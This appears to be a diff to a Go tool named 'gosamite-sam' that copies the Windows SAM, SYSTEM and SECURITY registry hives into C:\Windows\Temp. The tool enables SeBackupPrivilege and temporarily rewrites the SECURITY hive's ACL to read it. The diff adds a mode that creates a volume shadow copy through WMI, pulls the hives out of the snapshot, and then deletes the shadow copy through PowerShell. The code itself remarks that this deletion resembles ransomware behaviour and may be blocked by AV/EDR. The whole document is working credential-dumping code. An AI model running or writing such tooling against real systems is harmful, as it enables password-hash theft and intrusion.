@@ -6,12 +6,22 @@ import (
 	"flag"
 	"fmt"
 	"os"
+	"os/exec"
+	"path/filepath"
+	"strings"
 	"time"
 	"unsafe"
 
+	"github.com/StackExchange/wmi"
+	"github.com/go-ole/go-ole"
+	"github.com/go-ole/go-ole/oleutil"
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 )
+
+type Win32_ShadowCopy struct {
+	DeviceObject string
+}
 
 var (
 	ntdll         = windows.NewLazyDLL("ntdll.dll")
@@ -32,36 +42,110 @@ var (
 	)
 
 	hives     []string
-	filenames []string = []string{
-		"C:\\Windows\\Temp\\samcopy",
-		"C:\\Windows\\Temp\\syscopy",
-		"C:\\Windows\\Temp\\seccopy",
-	}
+	filenames []string
 
-	clean = flag.Bool(
-		"cleanup",
-		false,
-		"Automatically delete saved copies of hives",
-	)
-	success bool = false
-
-	security = flag.Bool(
-		"security",
-		false,
-		"Enables the saving of SECURITY in addition to SAM/SYSTEM",
-	)
+	success, getsec, clean, volumeshadowcopy, vsccreated bool
 )
 
-func getproctoken() (windows.Token, error) {
-	var token windows.Token
-
-	fmt.Println("[+] Opening process token to adjust privileges")
-	err := windows.OpenProcessToken(
-		windows.CurrentProcess(),
-		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY,
-		&token,
+func adjusttokenprivs(
+	token windows.Token,
+	newState *windows.Tokenprivileges,
+	newStateBuffer []byte,
+) error {
+	fmt.Println("[+] Adjusting privileges")
+	err := windows.AdjustTokenPrivileges(
+		token,
+		false,
+		newState,
+		uint32(len(newStateBuffer)),
+		nil,
+		nil,
 	)
-	return token, err
+	return err
+}
+
+// Function to check if volume shadow copy exists
+// This was mostly taken from ChatGPT
+func checkifvscexists() bool {
+	ole.CoInitialize(0)
+	defer ole.CoUninitialize()
+
+	// Create a COM object for the Shadow Copy Service
+	unknown, err := oleutil.CreateObject(
+		"WbemScripting.SWbemLocator",
+	)
+	if err != nil {
+		fmt.Println("[!] Error creating SWbemLocator object:", err)
+		return false
+	}
+	defer unknown.Release()
+
+	// Get the IDispatch interface
+	wmi, err := unknown.QueryInterface(ole.IID_IDispatch)
+	if err != nil {
+		fmt.Println("[!] Error getting IDispatch interface:", err)
+		return false
+	}
+	defer wmi.Release()
+
+	// Call the ConnectServer method to connect to the WMI service
+	serviceRaw, err := oleutil.CallMethod(wmi, "ConnectServer")
+	if err != nil {
+		fmt.Println("[!] Error calling ConnectServer method:", err)
+		return false
+	}
+	service := serviceRaw.ToIDispatch()
+	defer service.Release()
+
+	// Query for the Win32_ShadowCopy class
+	query := "SELECT * FROM Win32_ShadowCopy"
+	resultRaw, err := oleutil.CallMethod(service, "ExecQuery", query)
+	if err != nil {
+		fmt.Println("[!] Error calling ExecQuery method:", err)
+		return false
+	}
+	result := resultRaw.ToIDispatch()
+	defer result.Release()
+
+	countVariant, err := oleutil.GetProperty(result, "Count")
+	if err != nil {
+		fmt.Println("[!] Error getting Count property:", err)
+		return false
+	}
+	count := int(countVariant.Val)
+
+	if count > 0 {
+		fmt.Println("[+] At least one volume shadow copy exists")
+		return true
+	} else {
+		fmt.Println("[+] No volume shadow copies found.")
+		return false
+	}
+
+}
+
+func cleanup() {
+	fmt.Println("[+] Waiting 10 seconds before cleaning up...")
+	time.Sleep(10 * time.Second)
+	fmt.Println("[+] Cleaning up")
+
+	if success {
+		fmt.Println("[+] Attempting to remove saved files")
+		for _, f := range filenames {
+			if _, err := os.Stat(f); err == nil {
+				err = os.Remove(f)
+				if err != nil {
+					fmt.Printf("[-] Could not remove %s\n", f)
+				} else {
+					fmt.Printf("[+] Successfully removed %s\n", f)
+				}
+			}
+		}
+	} else {
+		fmt.Println("[-] No files to clean up")
+	}
+
+	// disablepriv("SeBackupPrivilege")
 }
 
 func createnewstate(
@@ -93,21 +177,71 @@ func createnewstate(
 	return newState, newStateBuffer
 }
 
-func adjusttokenprivs(
-	token windows.Token,
-	newState *windows.Tokenprivileges,
-	newStateBuffer []byte,
-) error {
-	fmt.Println("[+] Adjusting privileges")
-	err := windows.AdjustTokenPrivileges(
-		token,
-		false,
-		newState,
-		uint32(len(newStateBuffer)),
+func createvsc() {
+	_, e := wmi.CallMethod(
 		nil,
-		nil,
+		"Win32_ShadowCopy",
+		"Create",
+		[]interface{}{"C:\\"},
 	)
-	return err
+	if e != nil {
+		fmt.Printf("[!] Error creating volume shadow copy: %s", e)
+		fmt.Printf("[!] Can't do it without the copy, exiting...")
+		os.Exit(-1)
+	}
+
+	fmt.Println("[+] Volume shadow copy successfully created")
+}
+
+/*
+Function to disable a privilege for cleanup
+It's probably not needed, but leaving this in here
+in case it's needed for future use
+*/
+/*
+func disablepriv(priv string) {
+	var token windows.Token
+	token, err := getproctoken()
+	if err != nil {
+		fmt.Printf("[!] Error cleaning up: %s\n", err)
+	}
+
+	var newState *windows.Tokenprivileges
+	var newStateBuffer []byte
+	newState, newStateBuffer = createnewstate(
+		priv,
+		windows.SE_PRIVILEGE_REMOVED,
+	)
+
+	err = adjusttokenprivs(token, newState, newStateBuffer)
+	if err != nil {
+		fmt.Printf("[!] Error cleaning up: %s\n", err)
+	}
+}
+*/
+
+func deletevsc() {
+	var cmd *exec.Cmd
+	var e error
+	fmt.Println("[+] Removing volume shadow copy")
+	fmt.Println("[+] NOTE: this may be detected/blocked by AV/EDR")
+	fmt.Println("[+] because it resembles ransomware behavior; ")
+	fmt.Println("[+] manual removal may be required")
+	cmd = exec.Command(
+		"powershell.exe",
+		"-c",
+		"Get-CimInstance -ClassName Win32_ShadowCopy"+
+			" | Remove-CimInstance",
+	)
+	e = cmd.Run()
+	if e != nil {
+		fmt.Printf(
+			"[!] Unable to remove the volume shadow copy: %s\n",
+			e,
+		)
+	} else {
+		fmt.Println("[+] Successfully removed volume shadow copy")
+	}
 }
 
 /*
@@ -140,32 +274,76 @@ func enablepriv(priv string) {
 	}
 }
 
-/*
-Function to disable a privilege for cleanup
-It's probably not needed, but leaving this in here
-in case it's needed for future use
-*/
-/*
-func disablepriv(priv string) {
-	var token windows.Token
-	token, err := getproctoken()
-	if err != nil {
-		fmt.Printf("[!] Error cleaning up: %s\n", err)
+func execute() {
+	var oldentries []windows.EXPLICIT_ACCESS
+
+	if volumeshadowcopy {
+		vscsave()
+	} else {
+		fmt.Println("[+] Enabling SeBackupPrivilege")
+		enablepriv("SeBackupPrivilege")
+
+		if getsec {
+			fmt.Println(
+				"[+] Giving ourselves READ access " +
+					"to the SECURITY hive.",
+			)
+			oldentries = getsecreadpermission()
+		}
+
+		fmt.Println("[+] Saving the hives")
+		for i, h := range hives {
+			outfile := filenames[i]
+			savehive(h, outfile)
+		}
+
+		if getsec {
+			// Restore the original ACL EXPLICIT_ACCESS entries
+			revertsecpermissions(oldentries)
+			defer windows.LocalFree(
+				(windows.Handle)(unsafe.Pointer(&oldentries[0])),
+			)
+		}
 	}
 
-	var newState *windows.Tokenprivileges
-	var newStateBuffer []byte
-	newState, newStateBuffer = createnewstate(
-		priv,
-		windows.SE_PRIVILEGE_REMOVED,
-	)
+	fmt.Println("[+] Waiting 3 seconds before checking files...")
+	time.Sleep(3 * time.Second)
 
-	err = adjusttokenprivs(token, newState, newStateBuffer)
-	if err != nil {
-		fmt.Printf("[!] Error cleaning up: %s\n", err)
+	for _, f := range filenames {
+		if _, err := os.Stat(f); err == nil {
+			fmt.Printf("[+] %s exists, "+
+				"hive was successfully copied\n", f)
+			success = true
+		}
 	}
 }
-*/
+
+func getdeviceobject() string {
+	var dst []Win32_ShadowCopy
+	q := wmi.CreateQuery(&dst, "")
+	err := wmi.Query(q, &dst)
+	if err != nil {
+		fmt.Println("[!] Couldn't get DeviceObject")
+		fmt.Println("[!] Can't do it without DeviceObject, exiting")
+		os.Exit(-1)
+	}
+	fmt.Println("[+] Got the DeviceObect:")
+	fmt.Printf("[+] %s\n", dst[0].DeviceObject)
+	return dst[0].DeviceObject
+
+}
+
+func getproctoken() (windows.Token, error) {
+	var token windows.Token
+
+	fmt.Println("[+] Opening process token to adjust privileges")
+	err := windows.OpenProcessToken(
+		windows.CurrentProcess(),
+		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY,
+		&token,
+	)
+	return token, err
+}
 
 // Function to give ourselves read permission to the SECURITY
 // hive so that we can save a copy of it
@@ -257,7 +435,9 @@ func getsecreadpermission() []windows.EXPLICIT_ACCESS {
 
 	// Sometimes running this gets wonky, so we will print the
 	// access mask entries in case they're needed for debugging
-	fmt.Println("[+] Access mask values from EXPLICIT_ACCESS entries:")
+	fmt.Println(
+		"[+] Access mask values from EXPLICIT_ACCESS entries:",
+	)
 	for _, entry := range oldentries {
 		fmt.Printf("[+] Access Mask: %d\n", entry.AccessPermissions)
 	}
@@ -312,6 +492,98 @@ func getsecreadpermission() []windows.EXPLICIT_ACCESS {
 	return oldentries
 }
 
+func main() {
+	flag.Parse()
+	if flag.NArg() == 0 {
+		getsec = true
+		hives = append(hives, "SYSTEM", "SECURITY", "SAM")
+		filenames = append(
+			filenames,
+			"C:\\Windows\\Temp\\syscopy",
+			"C:\\Windows\\Temp\\seccopy",
+			"C:\\Windows\\Temp\\samcopy",
+		)
+	} else {
+		for _, a := range flag.Args() {
+			switch strings.ToUpper(a) {
+			case "SAM":
+				hives = append(hives, strings.ToUpper(a))
+				filenames = append(
+					filenames,
+					"C:\\Windows\\Temp\\samcopy",
+				)
+			case "SYSTEM":
+				hives = append(hives, strings.ToUpper(a))
+				filenames = append(
+					filenames,
+					"C:\\Windows\\Temp\\syscopy",
+				)
+			case "SECURITY":
+				getsec = true
+				hives = append(hives, strings.ToUpper(a))
+				filenames = append(
+					filenames,
+					"C:\\Windows\\Temp\\seccopy",
+				)
+			case "CLEAN":
+				clean = true
+			case "VSC":
+				volumeshadowcopy = true
+			default:
+				fmt.Printf(
+					"[!] Invalid argument: %s\n\n",
+					a,
+				)
+				printusage()
+				return
+			}
+		}
+		if len(hives) == 0 {
+			getsec = true
+			hives = append(hives, "SYSTEM", "SECURITY", "SAM")
+			filenames = append(
+				filenames,
+				"C:\\Windows\\Temp\\syscopy",
+				"C:\\Windows\\Temp\\seccopy",
+				"C:\\Windows\\Temp\\samcopy",
+			)
+		}
+	}
+
+	execute()
+	if clean {
+		cleanup()
+	}
+
+	if success {
+		fmt.Println("[+] WOOOOOO! At least one hive was copied")
+		fmt.Println("[+] Have a nice day")
+		os.Exit(0)
+	} else {
+		fmt.Println("[-] Execution was blocked (or errored out)")
+		fmt.Println("[+] Your day can only get better from here")
+		os.Exit(1)
+
+	}
+}
+
+func printusage() {
+	fmt.Println("Usage:")
+	fmt.Println("gosamite-sam [hives] [vsc] [clean]\n")
+	fmt.Println("Options:")
+	fmt.Println("hives (can be any subset in any order):")
+	fmt.Println("    SYSTEM")
+	fmt.Println("    SECURITY")
+	fmt.Println("    SAM")
+	fmt.Println("(Default: All 3, in the above order)")
+	fmt.Println("vsc: use volume shadow copy instead of registry")
+	fmt.Println(
+		"clean: automatically remove any saved files " +
+			"after a 10 second sleep",
+	)
+	fmt.Println("(copied files will be saved in C:\\Windows\\Temp)")
+}
+
 // Function to restore the original ACL of the SECURITY hive
 func revertsecpermissions(oldentries []windows.EXPLICIT_ACCESS) {
 	var newacl windows.Handle
@@ -354,6 +626,69 @@ func revertsecpermissions(oldentries []windows.EXPLICIT_ACCESS) {
 		fmt.Println("[!} Couldn't apply the old ACL...]")
 		fmt.Println("[!] You may have to manually fix it")
 
+	}
+}
+
+func savefromvsc(deviceobject string) {
+	var srcpath, dstpath string
+	var srcfile, dstfile *os.File
+	var bufsize, bytesread int
+	var buf []byte
+	var err error
+
+	for i, h := range hives {
+		fmt.Printf("[+] Attempting to copy %s\n", h)
+		srcpath = filepath.Join(
+			deviceobject,
+			"Windows",
+			"System32",
+			"config",
+			h,
+		)
+		dstpath = filenames[i]
+
+		srcfile, err = os.Open(srcpath)
+		if err != nil {
+			fmt.Printf("[!] Error opening %s\n", srcpath)
+			fmt.Printf("[!] Skipping %s\n", h)
+			continue
+		}
+
+		dstfile, err = os.Create(dstpath)
+		if err != nil {
+			fmt.Printf("[!] Error opening %s\n", dstpath)
+			fmt.Println("[!] Can't write to Windows\\Temp, exiting")
+			os.Exit(-1)
+		}
+
+		bufsize = 4096
+		buf = make([]byte, bufsize)
+		for {
+			bytesread, err = srcfile.Read(buf)
+			if err != nil && err.Error() != "EOF" {
+				fmt.Printf("[!] Error reading from %s\n", srcpath)
+				fmt.Printf("[!] %s", err)
+				srcfile.Close()
+				dstfile.Close()
+				break
+			}
+			if bytesread == 0 {
+				srcfile.Close()
+				dstfile.Close()
+				break
+			}
+
+			_, err = dstfile.Write(buf[:bytesread])
+			if err != nil {
+				fmt.Println("[!] Can't copy to Windows\\Temp, exiting")
+				os.Exit(-1)
+			}
+		}
+		fmt.Printf(
+			"[+] Successfully copied %s from volume shadow copy "+
+				"to Windows Temp folder\n",
+			h,
+		)
 	}
 }
 
@@ -413,86 +748,28 @@ func savehive(hive string, outfile string) {
 	defer windows.Close(fh)
 }
 
-func execute() {
-	var oldentries []windows.EXPLICIT_ACCESS
+func vscsave() {
+	var vscexists bool
+	var deviceobject string
 
-	fmt.Println("[+] Enabling SeBackupPrivilege")
-	enablepriv("SeBackupPrivilege")
+	fmt.Println(
+		"[+] Checking if a volume shadow copy already exists",
+	)
+	vscexists = checkifvscexists()
 
-	if *security {
-		hives = []string{"SAM", "SYSTEM", "SECURITY"}
-		fmt.Println("[+] Giving ourselves READ access to the SECURITY hive.")
-		oldentries = getsecreadpermission()
-	} else {
-		hives = []string{"SAM", "SYSTEM"}
+	if !vscexists {
+		fmt.Println("[+] Creating volume shadow copy")
+		vsccreated = true
+		createvsc()
 	}
 
-	fmt.Println("[+] Saving the hives")
-	for i, h := range hives {
-		outfile := filenames[i]
-		savehive(h, outfile)
+	fmt.Println("[+] Getting DeviceObject of volume shadow copy")
+	deviceobject = getdeviceobject()
+
+	savefromvsc(deviceobject)
+
+	if !vscexists {
+		deletevsc()
 	}
 
-	if *security {
-		// Restore the original ACL EXPLICIT_ACCESS entries
-		revertsecpermissions(oldentries)
-		defer windows.LocalFree(
-			(windows.Handle)(unsafe.Pointer(&oldentries)),
-		)
-	}
-
-	fmt.Println("[+] Waiting 3 seconds before checking files...")
-	time.Sleep(3 * time.Second)
-
-	for _, f := range filenames {
-		if _, err := os.Stat(f); err == nil {
-			fmt.Printf("[+] %s exists, "+
-				"hive was successfully copied\n", f)
-			success = true
-		}
-	}
-
-}
-
-func cleanup() {
-	fmt.Println("[+] Waiting 10 seconds before cleaning up...")
-	time.Sleep(10 * time.Second)
-	fmt.Println("[+] Cleaning up")
-
-	if success {
-		fmt.Println("[+] Attempting to remove saved files")
-		for _, f := range filenames {
-			if _, err := os.Stat(f); err == nil {
-				err = os.Remove(f)
-				if err != nil {
-					fmt.Printf("[-] Could not remove %s\n", f)
-				} else {
-					fmt.Printf("[+] Successfully removed %s\n", f)
-				}
-			}
-		}
-	} else {
-		fmt.Println("[-] Nothing to clean up")
-	}
-	// disablepriv("SeBackupPrivilege")
-}
-
-func main() {
-	flag.Parse()
-	execute()
-
-	if *clean {
-		cleanup()
-	}
-
-	if success {
-		fmt.Println("[+] WOOOOOO! At least one hive was copied")
-		fmt.Println("[+] Have a nice day")
-		os.Exit(0)
-	} else {
-		fmt.Println("[-] Execution was blocked (or errored out)")
-		fmt.Println("[+] Your day can only get better from here")
-		os.Exit(1)
-
-	}
 }
